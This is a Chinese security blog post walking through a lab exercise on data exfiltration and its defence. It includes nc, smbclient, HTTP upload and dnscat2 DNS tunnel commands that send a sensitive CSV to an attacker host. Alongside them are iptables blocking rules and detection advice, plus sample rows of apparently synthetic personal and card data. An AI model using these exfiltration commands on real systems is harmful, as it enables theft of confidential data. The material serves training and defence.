<!doctype html>
<html lang="zh-cn">
<head>

    <meta charset="utf-8">
    <meta name="generator" content="Hugo 0.78.0" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>Egress Analysis | GET command and control</title>
    <meta property="og:title" content="Egress Analysis - GET command and control">
    <meta property="og:type" content="article">
        
    <meta property="article:published_time" content="2020-12-30T09:52:56&#43;08:00">
        
        
    <meta property="article:modified_time" content="2020-12-30T09:52:56&#43;08:00">
        
    <meta name="Keywords" content="penetration">
    <meta name="description" content="Egress Analysis">
        
    <meta name="author" content="KUHAKU">
    <meta property="og:url" content="https://GETC2.github.io/post/egress-analysis/">
    <link rel="shortcut icon" href="/favicon-bug.ico" type="image/x-icon">

    <link rel="stylesheet" href="/css/normalize.css">
    
        <link rel="stylesheet" href="/css/prism.css">
    
    <link rel="stylesheet" href="/css/style.css">
    <script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>

    


    
    
</head>

<body>
<header id="header" class="clearfix">
    <div class="container">
        <div class="col-group">
            <div class="site-name ">
                
                    <a id="logo" href="https://GETC2.github.io/">
                        GET command and control
                    </a>
                
                <p class="description">Stay hungry. Stay foolish.</p>
            </div>
            <div>
                <nav id="nav-menu" class="clearfix">
                    <a class="current" href="https://GETC2.github.io/">首页</a>
                    
                </nav>
            </div>
        </div>
    </div>
</header>


<div id="body">
    <div class="container">
        <div class="col-group">

            <div class="col-8" id="main">
                <div class="res-cons">
                    <article class="post">
                        <header>
                            <h1 class="post-title">Egress Analysis</h1>
                        </header>
                        <date class="post-meta meta-date">
                            2020年12月30日
                        </date>
                        
                        
                        
                        <div class="post-content">
                            <h1 id="简介">简介</h1>
<p>作为红队，我们需要知道蓝队是如何防守的，这样我们才能更好地进攻。我们以Data Exfiltration为例，来研究蓝队是如何检测和阻止的。</p>
<h1 id="实验环境">实验环境</h1>
<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2020-12-30_10-08-37.png" alt=""></p>
<p>如上图所示，红队需要把sensitive_data.csv上传到攻击者的机器上；而蓝队需要检测并阻止红队的行为。</p>
<p>我们假定防守方一开始的安全措施很薄弱，随着攻击的进行，防守方需要针对性地对安全进行加固。</p>
<h1 id="攻防模拟">攻防模拟</h1>
<h2 id="第一回合">第一回合</h2>
<h4 id="1-红队攻击">1 红队攻击</h4>
<p>首先尝试直接利用nc从PCI File Server上上传文件到目标机器。</p>
<p>在攻击者机器上执行nc监听。</p>
<p><code>root@externalattackerbox:/# nc -lvnp 10000 &gt; sensitive_data.csv</code></p>
<p>然后登录到PCI File Server利用nc上传文件。</p>
<p><code>root@pcifileserver:/# nc 5.30.5.1 10000 -n -q1 &lt; /opt/confidential/sensitive_data.csv</code></p>
<p>回到攻击者机器上检测是否得到了目标文件。</p>
<p><code>root@externalattackerbox:/# tail sensitive_data.csv -n2</code></p>
<p><code>female    American    Mrs.    Patti    D    Sparks    4604 Patterson Fork RoadChicago    IL    Illinois    60606    US    United States    PattiDSparks@einrot.com    Sled1962    oim2or0ahPh    &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36&quot;    312-630-4213    1    Efird    8/14/1962    54    Visa    4.53906E+15    696    Dec-18    357-04-8242    Red    Commercial and industrial designer    Chatham1998 Suzuki X90    225.5    &quot;5' 9&quot;&quot;&quot;    41.842489    -87.708556 female    American    Ms.    Jennifer    K    Fuentes    4853 Fleming Street    Montgomery    AL    Alabama    36104    US    United States    JenniferKFuentes@gustr.com    Agning    ioSohquij1co    &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36&quot;    334-432-2572    1    Horton    3/21/1974    42    Visa    4.55602E+15    433    Oct-18    417-90-1544    Black    Programmer    Grade A Investment    2012 Land Rover Range Rover Evoque    228.8    &quot;5' 7&quot;&quot;&quot;    32.365291    -86.232287</code></p>
<p>可以看到，攻击成功了。</p>
<h4 id="2-蓝队加固">2 蓝队加固</h4>
<p>作为蓝队，在发现秘密文件被直接从PCI File Server发送到网络中后，我们可以禁止从PCI File Server进行连接。</p>
<p>（由于攻击者机器及文件服务器都是作为docker在VM中模拟的，所以我们直接在VM中的iptables进行防火墙设定）</p>
<p><code>$ sudo iptables -A INPUT -j LOGGING $ sudo iptables -A LOGGING -m limit --limit 2/min -j LOG -s 172.17.0.2 --log-prefix &quot;EGRESS: &quot; --log-level 4 $ sudo iptables -A INPUT -s 172.17.0.2 -d 5.30.5.1 -j DROP</code></p>
<p>此时我们再去文件服务器连接攻击者机器。</p>
<p><code>root@pcifileserver:/# nc -zvn 5.30.5.1 10000 -w1</code></p>
<p><code>(UNKNOWN) [5.30.5.1] 10000 (?) : Connection timed out</code></p>
<p>可以发现连接无法外出。</p>
<p>另外由于我们之前在设定防火墙规则时也进行了log，我们可以查看log。</p>
<p><code>$ grep EGRESS /var/log/syslog</code></p>
<p><code>Dec 29 20:16:54 Security530 kernel: [ 1252.909508] EGRESS: IN=docker0 OUT= PHYSIN=veth9e0449a MAC=02:42:e4:7a:52:77:02:42:ac:11:00:02:08:00 SRC=172.17.0.2 DST=5.30.5.1 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=24814 DF PROTO=TCP SPT=34704 DPT=10000 WINDOW=29200 RES=0x00 SYN URGP=0 </code></p>
<h2 id="第二回合">第二回合</h2>
<h4 id="1-红队进攻">1 红队进攻</h4>
<p>经过蓝队的巩固之后，作为红队发现从文件服务器上无法外连。但是文件服务器的445端口开启了，我们可以先通过smb把文件下载到被攻破的主机上，然后再外连。</p>
<p><code>$ smbclient //172.17.0.2/pci -c &quot;get sensitive_data.csv&quot; -N</code></p>
<p><code>WARNING: The &quot;syslog&quot; option is deprecated Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.7.6-Ubuntu] getting file \sensitive_data.csv of size 1281409 as sensitive_data.csv (125136.4 KiloBytes/sec) (average 125137.6 KiloBytes/sec)</code></p>
<p><code>[~]$ ls @                       Downloads           pcaps 1.21.0-shared.sock      errorpage.css       Pictures Backups                 GPUCache            Preferences Cache                   labs                Public CachedData              languagepacks.json  sensitive_data.csv CachedExtensions        Local Storage       squid.conf check-config.sh         logs                squid.conf.dist Cookies                 machineid           storage.json Cookies-journal         microsoft.gpg       Templates database_reference.csv  microsoft.gpgsudo   tmp Desktop                 msntauth.conf       User Documents               Music               Videos</code></p>
<p>然后尝试从这台主机上直接连接攻击者机器。</p>
<p><code>$ nc 5.30.5.1 10000 -n -q1 &lt; sensitive_data.csv</code></p>
<p>我们可以发现，攻击者机器成功接收文件。</p>
<p><code>root@externalattackerbox:/# nc -lvnp 10000 &gt; sensitive_data.csv listening on [any] 10000 ... connect to [5.30.5.2] from (UNKNOWN) [5.30.5.1] 40576 root@externalattackerbox:/# </code></p>
<h4 id="2-蓝队加固-1">2 蓝队加固</h4>
<p>经过监测我们发现文件从一台主机（VM）传到攻击者机器上。我们可以设置默认禁止的防火墙规则。只允许443端口和53端口的外出。</p>
<p><code>$ sudo iptables -A INPUT -d 5.30.5.1 -p udp --dport 53 -j ACCEPT $ sudo iptables -A INPUT -d 5.30.5.1 -p tcp --dport 443 -j ACCEPT $ sudo iptables -A OUTPUT -p tcp --dport 10000 -j DROP</code></p>
<p>这里的端口10000是为了方便模拟所有不允许外出的端口。</p>
<h2 id="第三回合">第三回合</h2>
<h4 id="1-红队进攻-1">1 红队进攻</h4>
<p>上一回合蓝队加固了被攻破的主机，只允许从443和53端口外出，这是默认允许此台主机可以使用HTTPS和DNS服务。作为红队，我们可以在攻击者主机上开放443端口服务（HTTP或者HTTPS都可以）。</p>
<p><code>google-chrome http://5.30.5.1:443</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2020-12-30_12-04-34.png" alt=""></p>
<p><img src="https://cdn.jsdelivr.net/gh/GETC2/blog-pics@master/img/Snipaste_2020-12-30_12-07-22.png" alt=""></p>
<p>利用攻击者主机搭建的HTTP服务可以上传文件。</p>
<p>回到攻击者主机上面可以验证文件已经上传了。</p>
<p><code>root@externalattackerbox:/# tail /var/www/html/uploads/sensitive_data.csv -n2</code></p>
<p>第二个开放的端口53是为了允许DNS服务。我们可以用DNS隧道上传文件。</p>
<p>在攻击者机器上执行以下命令 ：</p>
<p><code>root@externalattackerbox:/# ruby /home/exfil/dnscat2/server/dnscat2.rb</code></p>
<p>接着在VM上执行DNS隧道客户端：</p>
<p><code>$ /labs/egress/dnscat2/client/dnscat --dns=server=5.30.5.1,port=53</code></p>
<p>再回到DNS服务端执行以下命令和客户端交互：</p>
<p><code>dnscat2&gt; window -i 1</code></p>
<p>接着在服务端执行以下命令来上传文件：</p>
<p><code>command (Security530) 1&gt; download sensitive_data.csv</code></p>
<h4 id="2-蓝队加固待定">2 蓝队加固（待定）</h4>
<p>虽然我们使用主机防火墙限定了主机使用HTTPS和DNS服务，但是iptables无法识别应用层行为。为了防止攻击者利用HTTPS和DNS隧道上传文件，我们需要带有应用控制的下一代防火墙（NGFW），IDS或者IPS。</p>
<p>另外通过分析DNS log也可以发现异常行为。被攻破主机在短时间内进行了许多A类型和CNAME类型之外的DNS查询。</p>

                        </div>

                        


                        

<div class="post-archive">
    <h2>See Also</h2>
    <ul class="listing">
        
        <li><a href="/post/accessing-internal-websites/">Accessing Internal Websites</a></li>
        
        <li><a href="/post/access-restricted-func/">Access Restricted Func</a></li>
        
        <li><a href="/post/web-cache-poison/">Web Cache Poisoning</a></li>
        
        <li><a href="/post/password-reset-poisoning/">Password Reset Poisoning</a></li>
        
        <li><a href="/post/host-head-attack/">Host头部攻击</a></li>
        
    </ul>
</div>


                        <div class="post-meta meta-tags">
                            
                            没有标签
                            
                        </div>
                    </article>
                    
    

    
    
                </div>
            </div>
            <div id="secondary">
    <section class="widget">
        <form id="search" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank" _lpchecked="1">
      
      <input type="text" name="q" maxlength="20" placeholder="Search">
      <input type="hidden" name="sitesearch" value="https://GETC2.github.io/">
      <button type="submit" class="submit icon-search"></button>
</form>
    </section>
    
    <section class="widget">
        <h3 class="widget-title">订阅</h3>
        <ul class="widget-list">
            <li><a href="https://GETC2.github.io/index.xml">RSS</a></li>
        </ul>
    </section>

    

    <section class="widget">
        <h3 class="widget-title">分类</h3>
<ul class="widget-list">
    
</ul>
    </section>

    
    <section class="widget">
        <h3 class="widget-title">最近文章</h3>
<ul class="widget-list">
    
    <li>
        <a href="https://GETC2.github.io/post/file-inclusion/" title="File Inclusion">File Inclusion</a>
    </li>
    
    <li>
        <a href="https://GETC2.github.io/post/windows-buffer-overflow2/" title="Windows Buffer Overflow(2)">Windows Buffer Overflow(2)</a>
    </li>
    
    <li>
        <a href="https://GETC2.github.io/post/windows-buffer-overflow/" title="Windows Buffer Overflow">Windows Buffer Overflow</a>
    </li>
    
    <li>
        <a href="https://GETC2.github.io/post/buffer-overflow5/" title="Buffer Overflow(5)">Buffer Overflow(5)</a>
    </li>
    
    <li>
        <a href="https://GETC2.github.io/post/buffer-overflow4/" title="Buffer Overflow(4)">Buffer Overflow(4)</a>
    </li>
    
    <li>
        <a href="https://GETC2.github.io/post/buffer-overflow3/" title="Buffer Overflow(3)">Buffer Overflow(3)</a>
    </li>
    
    <li>
        <a href="https://GETC2.github.io/post/buffer-overflow2/" title="Buffer Overflow(2)">Buffer Overflow(2)</a>
    </li>
    
    <li>
        <a href="https://GETC2.github.io/post/buffer-overflow/" title="Buffer Overflow">Buffer Overflow</a>
    </li>
    
    <li>
        <a href="https://GETC2.github.io/post/afl-fuzzing/" title="AFL Fuzzing">AFL Fuzzing</a>
    </li>
    
    <li>
        <a href="https://GETC2.github.io/post/sulley-fuzzing/" title="Sulley Fuzzing">Sulley Fuzzing</a>
    </li>
    
</ul>

    </section>
    

    <section class="widget">
        <h3 class="widget-title">标签</h3>
<div class="tagcloud">
    
</div>
    </section>

    

    </div>

        </div>
    </div>
</div>
<footer id="footer">
    <div class="container">
        &copy; 2021 <a href="https://GETC2.github.io/">GET command and control</a>.
        Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io" target="_blank">Hugo</a>.
        <a href="https://www.flysnow.org/" target="_blank">Theme</a> based on <a href="https://github.com/skydamon/maupassant-hugo" target="_blank">maupassant</a>.
        
    </div>
</footer>


    <script type="text/javascript">
    
    (function(){
        $("pre code").parent().addClass("line-numbers")
    }())

    window.MathJax = {
        tex2jax: {
            inlineMath: [ ['$','$'] ],
            processEscapes: true
        }
    };
    </script>
    <script type="text/javascript" src="/js/prism.js" async="true"></script>
    <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML' async></script>

<a id="rocket" href="#top"></a>
<script type="text/javascript" src="/js/totop.js?v=0.0.0" async=""></script>







</body>
</html>
